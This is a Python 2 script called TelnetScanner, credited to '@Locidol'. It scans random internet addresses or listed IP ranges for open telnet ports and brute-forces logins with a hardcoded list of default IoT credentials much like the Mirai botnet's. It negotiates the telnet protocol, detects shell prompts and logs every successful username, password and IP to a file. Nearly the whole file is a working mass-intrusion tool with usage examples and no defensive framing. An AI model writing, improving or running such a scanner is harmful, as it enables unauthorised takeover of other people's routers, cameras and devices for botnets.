r"""
    From @Locidol with love <3
"""

import socket
from threading import Thread
import sys
import threading
from netaddr import IPNetwork
import logging
import os
import argparse
import struct
import random
import time


logging.basicConfig(filename='data.log', level=logging.DEBUG)


dic = {
    "root":
    [
        "vizxv",
        "xc3511",
        "888888",
        "xmhdipc",
        "default",
        "juantech",
        "123456",
        "54321",
        "",
        "root",
        "12345",
        "pass",
        "1111",
        "666666",
        "password",
        "1234",
        "klv123",
        "klv1234",
        "Zte521",
        "hi3518",
        "jvbzd",
        "anko",
        "zlxx",
        "system",
        "ikwb",
        "dreambox",
        "user",
        "realtek",
        "00000000",
    ],
    "admin":
    [
        "root",
        "zoomadsl",
        "",
        "password",
        "admin",
        "admin1234",
        "smcadmin",
        "1111",
        "12345678",
        "1234",
        "12345",
        "54321",
        "123456",
        "4321",
        "pass",
        "meinsm",
        "vnpt",
    ],
    "support":
    [
        "support",
    ],
    "user":
    [
        "user",
    ],
    "supervisor":
    [
        "supervisor",
    ],
    "tech":
    [
        "tech",
    ],
    "administrator":
    [
        "1234",
    ],
    "vodafone":
    [
        "vodafone",
    ],
}

# Telnet protocol get from telnetlib characters (don't change)
IAC = chr(255)  # "Interpret As Command"
DONT = chr(254)
DO = chr(253)
WONT = chr(252)
WILL = chr(251)
theNULL = chr(0)

SE = chr(240)  # Subnegotiation End
NOP = chr(241)  # No Operation
DM = chr(242)  # Data Mark
BRK = chr(243)  # Break
IP = chr(244)   # Interrupt process
AO = chr(245)   # Abort output
AYT = chr(246)  # Are You There
EC = chr(247)  # Erase Character
EL = chr(248)  # Erase Line
G = chr(249)  # Go Ahead
SB = chr(250)  # Subnegotiation Begin


# Telnet protocol options code (don't change)
# These ones all come from arpa/telnet.h
BINARY = chr(0)  # 8-bit data path
ECHO = chr(1)  # echo
RCP = chr(2)  # prepare to reconnect
SGA = chr(3)  # suppress go ahead
NAMS = chr(4)  # approximate message size
STATUS = chr(5)  # give status
TM = chr(6)  # timing mark
RCTE = chr(7)  # remote controlled transmission and echo
NAOL = chr(8)  # negotiate about output line width
NAOP = chr(9)  # negotiate about output page size
NAOCRD = chr(10)  # negotiate about CR disposition
NAOHTS = chr(11)  # negotiate about horizontal tabstops
NAOHTD = chr(12)  # negotiate about horizontal tab disposition
NAOFFD = chr(13)  # negotiate about formfeed disposition
NAOVTS = chr(14)  # negotiate about vertical tab stops
NAOVTD = chr(15)  # negotiate about vertical tab disposition
NAOLFD = chr(16)  # negotiate about output LF disposition
XASCII = chr(17)  # extended ascii character set
LOGOUT = chr(18)  # force logout
BM = chr(19)  # byte macro
DET = chr(20)  # data entry terminal
SUPDUP = chr(21)  # supdup protocol
SUPDUPOUTPUT = chr(22)  # supdup output
SNDLOC = chr(23)  # send location
TTYPE = chr(24)  # terminal type
EOR = chr(25)  # end or record
TUID = chr(26)  # TACACS user identification
OUTMRK = chr(27)  # output marking
TTYLOC = chr(28)  # terminal location number
VT3270REGIME = chr(29)  # 3270 regime
X3PAD = chr(30)  # X.3 PAD
NAWS = chr(31)  # window size
TSPEED = chr(32)  # terminal speed
LFLOW = chr(33)  # remote flow control
LINEMODE = chr(34)  # Linemode option
XDISPLOC = chr(35)  # X Display Location
OLD_ENVIRON = chr(36)  # Old - Environment variables
AUTHENTICATION = chr(37)  # Authenticate
ENCRYPT = chr(38)  # Encryption option
NEW_ENVIRON = chr(39)  # New - Environment variables

TN3270E = chr(40)  # TN3270E
XAUTH = chr(41)  # XAUTH
CHARSET = chr(42)  # CHARSET
RSP = chr(43)  # Telnet Remote Serial Port
COM_PORT_OPTION = chr(44)  # Com Port Control Option
SUPPRESS_LOCAL_ECHO = chr(45)  # Telnet Suppress Local Echo
TLS = chr(46)  # Telnet Start TLS
KERMIT = chr(47)  # KERMIT
SEND_URL = chr(48)  # SEND-URL
FORWARD_X = chr(49)  # FORWARD_X
PRAGMA_LOGON = chr(138)  # TELOPT PRAGMA LOGON
SSPI_LOGON = chr(139)  # TELOPT SSPI LOGON
PRAGMA_HEARTBEAT = chr(140)  # TELOPT PRAGMA HEARTBEAT

data = ""


def banner():
    banner = """
 _____    _            _   ____                                  
|_   _|__| |_ __   ___| |_/ ___|  ___ __ _ _ __  _ __   ___ _ __ 
  | |/ _ \ | '_ \ / _ \ __\___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
  | |  __/ | | | |  __/ |_ ___) | (_| (_| | | | | | | |  __/ |   
  |_|\___|_|_| |_|\___|\__|____/ \___\__,_|_| |_|_| |_|\___|_|   
                                                                 

        """
    return banner


def is_alive(ip):
    return os.system("ping -w 1 " + ip + ">> /dev/null") is 0


def is_open_port_23(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    try:
        result = sock.connect_ex((ip, 23))
        sock.close()
        return not result
    except Exception, b:
        logging.debug(str(b) + ip)
        return False


def commandControl(sock, data):
    if data[1] and data[2] and [data[0], data[1], data[2]] == [IAC, DO, NAWS]:
        res_msg = IAC + WILL + NAWS + IAC + SB + NAMS + \
            theNULL + chr(80) + theNULL + TTYPE + IAC + SE
        sock.send(res_msg)
        return

    data = list(data)
    for i in range(len(data)):
        if data[i] == DO:
            data[i] = WONT
        if data[i] == WILL:
            data[i] = DO
    res_msg = ''.join(data)
    sock.send(res_msg)
    return


def prompt_IAC(data):

    if data and data[0] == IAC:
        for c in data:
            if ord(c) > 50 and ord(c) < 128:
                return False
        return True
    return False


def prompt_reply_user(user, data):
    if data and user and user == data:
        return True
    return False


def prompt_login(data):
    if data and "ogin:" in data:
        return True
    if data and "name:" in data:
        return True
    return False


def prompt_password(data):
    if data and "word:" in data:
        return True
    if data and "word>" in data:
        return True
    return False


def prompt_end_password(data):
    if data == "\r\n":
        return True
    return False


def prompt_shell(data):
    if data and "assword>" in data:
        return False
    if data and "ame>" in data:
        return False
    if data and data[-1:] == ">":
        return True
    if data and data[-1:] == "#":
        return True
    if data and data[-1:] == "\%":
        return True
    if data and data[-1:] == "$":
        return True
    if data and data[-2:] == "> ":
        return True
    if data and data[-2:] == "# ":
        return True
    if data and data[-2:] == "\% ":
        return True
    if data and data[-2:] == "$ ":
        return True
    return False


def prompt_block(data):
    if data and "refused" in data:
        return True
    if data and "lock" in data:
        return True
    if data and "rejected" in data:
        return True
    if data and "eject the connection" in data:
        return True
    return False


def prompt_limit(data):
    if data and "limit" in data:
        return True
    return False


def prompt_login_failed(data):
    if data and "ncorrect" in data:
        return True
    if data and "ailed" in data:
        return True
    if data and "nvalid" in data:
        return True
    return False


def optimus(ip):
    if not is_open_port_23(ip):
        sys.exit(1)
    logging.debug("O: " + ip)
    # print "try ", ip
    for key in dic:
        i = 0
        values = dic[key]
        while i < len(values):
            tried = 0
            just_prompted_IAC = False
            prompted_login = False
            prompted_password = False
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, 23))
                s.settimeout(60)
                data = None
                while True:
                    pre_data = data
                    data = s.recv(4096)
                    # print data
                    if not data:
                        if not pre_data:
                            if tried > 1:
                                logging.error("CLOSE: " + ip)
                                sys.exit(1)
                            tried += 1
                            time.sleep(5)
                            continue
                        break
                    else:
                        if prompt_IAC(data):
                            just_prompted_IAC = True
                            commandControl(s, data)
                            continue
                        elif prompt_login_failed(data):
                            break
                        elif prompt_login(data):
                            if prompted_login:
                                break
                            prompted_login = True
                            just_prompted_IAC = False
                            s.send(key + "\r\n")
                            continue
                        elif prompt_reply_user(key + "\r\n", data):
                            just_prompted_IAC = False
                            continue
                        elif prompt_password(data):
                            if prompted_password:
                                break
                            prompted_password = True
                            just_prompted_IAC = False
                            s.send(values[i] + "\r\n")
                            continue
                        elif prompt_end_password(data):
                            just_prompted_IAC = False
                            continue
                        elif prompt_shell(data):
                            logging.info(key + ":" + values[i] + "@" + ip)
                            sys.exit(1)
                        elif prompt_block(data):
                            logging.error("BLOCK: " + ip)
                            sys.exit(1)
                        elif prompt_limit(data):
                            logging.error("LIMIT: " + ip)
                            sys.exit(1)
                        elif just_prompted_IAC:
                            continue
                        else:
                            continue
                i += 1
            except Exception, e:
                if "ime" in str(e):
                    logging.error("BOT: " + ip)
                    sys.exit()
                if "refused" in str(e):
                    logging.error("BLOCK: " + ip)
                    sys.exit()
                logging.error("CLOSE: " + ip)
                sys.exit(1)
    logging.info("SEC: " + ip)


def scan_random_ip(maxThreadNum):
    while True:
        ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
        while threading.activeCount() > maxThreadNum:
            time.sleep(0.1)
        p = Thread(target=optimus, args=[ip])
        p.daemon = True
        p.start()


def scan_with_iprange(listip, maxThreadNum, debug=False):
    threads = []

    with open(listip) as f:
        lines = f.readlines()
        for line in lines:
            net = IPNetwork(line.strip())
            for ip in net:
                ip = str(ip)
                if debug:
                    optimus(ip)
                    return
                while threading.activeCount() > maxThreadNum:
                    time.sleep(1)
                p = Thread(target=optimus, args=[ip])
                p.daemon = True
                threads.append(p)
                p.start()
    for i in threads:
        i.join()


if __name__ == "__main__":

    print banner()

    parser = argparse.ArgumentParser(description="Scan default telnet with random ip or a list of ips",
                                     usage="\n\npython TelnetScanner.py -t 200\npython TelnetScanner.py -f listip.txt -t 200",)
    sgroup = parser.add_argument_group(
        "TelnetScanner", "Options for TelnetScanner")
    sgroup.add_argument("-t", dest="thread", required=False,
                        type=int, help="number of threads")
    sgroup.add_argument("-f", dest="file", required=False,
                        type=str, help="list ip")
    sgroup.add_argument("-d", dest="debug", required=False,
                        type=str, help="debug")
    options = parser.parse_args()

    if not options.thread:
        parser.print_help()
        sys.exit(1)

    if options.thread < 3:
        options.thread = 3

    if options.file:
        if options.debug:
            scan_with_iprange(options.file, options.thread, debug=True)
            sys.exit(1)
        scan_with_iprange(options.file, options.thread)
        sys.exit(1)

    if not options.file:
        scan_random_ip(options.thread)
        sys.exit(1)
